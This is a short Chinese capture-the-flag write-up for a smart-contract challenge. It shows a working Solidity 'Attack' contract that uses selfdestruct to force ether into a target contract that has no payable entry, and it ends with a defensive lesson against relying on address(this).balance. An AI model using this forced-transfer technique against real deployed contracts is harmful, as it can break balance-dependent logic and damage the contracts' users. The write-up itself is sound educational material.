# Transfer

## 题目简述

目标合约通过自身以太币余额判断是否完成，但没有提供普通转账入口，或其接收函数会拒绝转账。题目考查 EVM 中 `selfdestruct` 的强制转账行为：在该题使用的链环境中，销毁合约时可以把攻击合约的全部余额直接计入目标地址，而不执行目标合约的接收逻辑。

## 解题过程

部署一个持有目标实例地址的辅助合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable public victim;

    constructor(address victimAddress) {
        victim = payable(victimAddress);
    }

    function hack() external payable {
        selfdestruct(victim);
    }
}
```

调用 `hack()` 时附带一小笔以太币。`selfdestruct(victim)` 将攻击合约余额转到 `victim`。这一过程不是对目标执行普通的 `call{value: ...}("")`，因此即使目标没有 `receive()`、没有 payable fallback，或接收逻辑主动回滚，也无法阻止余额被增加。

随后再次调用题目合约的完成检查函数，目标余额已经满足条件，实例即可通过。

## 方法总结

合约不能把“没有 payable 入口”当作余额恒为零的保证。至少在本题所用 EVM 语义下，`selfdestruct` 可以强制转入以太币，区块奖励等机制也可能改变地址余额。业务状态应由明确的内部记账和受控入口决定，不能只依赖 `address(this).balance` 与预期值相等。
